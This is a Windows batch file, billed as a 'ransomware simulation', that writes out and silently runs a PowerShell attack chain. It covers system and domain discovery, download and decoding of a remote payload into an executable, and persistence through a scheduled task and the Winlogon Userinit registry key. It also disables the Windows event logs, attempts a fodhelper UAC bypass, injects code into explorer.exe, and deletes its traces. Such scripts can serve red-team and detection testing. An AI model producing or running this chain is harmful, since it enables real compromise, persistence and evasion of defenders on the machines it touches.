@echo off
setlocal EnableDelayedExpansion

REM === NSFW-Ransomware Enhanced Simulation Script ===

REM Create PowerShell script on disk
set "psScriptPath=%TEMP%\nsfw_simulation.ps1"

echo # NSFW-Ransomware PowerShell Simulation Script > "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 1: Process & System Discovery >> "%psScriptPath%"
echo tasklist /v ^| Out-File -FilePath C:\Temp\proc_list.txt >> "%psScriptPath%"
echo systeminfo ^| Out-File -FilePath C:\Temp\sysinfo.txt >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 2: Network & Domain Enumeration >> "%psScriptPath%"
echo net view ^| Out-File -FilePath C:\Temp\netshares.txt >> "%psScriptPath%"
echo nltest /domain_trusts ^| Out-File -FilePath C:\Temp\domain_trusts.txt >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 3: Download Base64 encoded payload >> "%psScriptPath%"
echo $payloadUrl = 'http://example.com/obfuscated_payload.b64' >> "%psScriptPath%"
echo $outputB64 = 'C:\Temp\payload.b64' >> "%psScriptPath%"
echo Invoke-WebRequest -Uri $payloadUrl -OutFile $outputB64 >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 4: Decode Base64 payload to exe >> "%psScriptPath%"
echo $payloadExe = 'C:\Temp\payload.exe' >> "%psScriptPath%"
echo $b64string = Get-Content $outputB64 -Raw >> "%psScriptPath%"
echo [System.IO.File]::WriteAllBytes($payloadExe, [Convert]::FromBase64String($b64string)) >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 5: Persistence via scheduled task >> "%psScriptPath%"
echo schtasks /Create /SC DAILY /TN "NSFWPersistence" /TR $payloadExe /ST 23:45 /F >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 6: Registry persistence via Winlogon helper DLL key >> "%psScriptPath%"
echo Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Winlogon" -Name Userinit -Value "$payloadExe," >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 7: Disable Windows Event Logs >> "%psScriptPath%"
echo wevtutil sl Security /e:false >> "%psScriptPath%"
echo wevtutil sl System /e:false >> "%psScriptPath%"
echo wevtutil sl Application /e:false >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 8: UAC bypass using fodhelper >> "%psScriptPath%"
echo Start-Process "fodhelper.exe" -ArgumentList $payloadExe >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 9: Reflective DLL Injection simulation >> "%psScriptPath%"
echo $dllPath = 'C:\Temp\inject.dll' >> "%psScriptPath%"
echo $targetProc = 'explorer' >> "%psScriptPath%"
echo $bytes = [System.IO.File]::ReadAllBytes($dllPath) >> "%psScriptPath%"
echo $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length) >> "%psScriptPath%"
echo [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length) >> "%psScriptPath%"
echo Add-Type -TypeDefinition @\" >> "%psScriptPath%"
echo using System; >> "%psScriptPath%"
echo using System.Runtime.InteropServices; >> "%psScriptPath%"
echo public class Inject { >> "%psScriptPath%"
echo [DllImport(\"kernel32\")] public static extern IntPtr OpenProcess(UInt32, bool, int); >> "%psScriptPath%"
echo [DllImport(\"kernel32\")] public static extern IntPtr VirtualAllocEx(IntPtr, IntPtr, UInt32, UInt32, UInt32); >> "%psScriptPath%"
echo [DllImport(\"kernel32\")] public static extern bool WriteProcessMemory(IntPtr, IntPtr, byte[], UInt32, IntPtr); >> "%psScriptPath%"
echo [DllImport(\"kernel32\")] public static extern IntPtr CreateRemoteThread(IntPtr, IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr); >> "%psScriptPath%"
echo } >> "%psScriptPath%"
echo \"@ >> "%psScriptPath%"
echo $proc = Get-Process $targetProc | Select-Object -First 1 >> "%psScriptPath%"
echo $handle = [Inject]::OpenProcess(0x1F0FFF, $false, $proc.Id) >> "%psScriptPath%"
echo $remote = [Inject]::VirtualAllocEx($handle, [IntPtr]::Zero, $bytes.Length, 0x1000, 0x40) >> "%psScriptPath%"
echo [Inject]::WriteProcessMemory($handle, $remote, $bytes, $bytes.Length, [IntPtr]::Zero) >> "%psScriptPath%"
echo [Inject]::CreateRemoteThread($handle, [IntPtr]::Zero, 0, $remote, [IntPtr]::Zero, 0, [IntPtr]::Zero) >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo # Step 10: Cleanup base64 payload >> "%psScriptPath%"
echo Remove-Item $outputB64 -Force >> "%psScriptPath%"
echo. >> "%psScriptPath%"

echo Write-Host "NSFW-Ransomware simulation complete." >> "%psScriptPath%"

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%psScriptPath%"
del "%psScriptPath%"

echo.
echo [*] NSFW-Ransomware simulation complete.
pause
endlocal
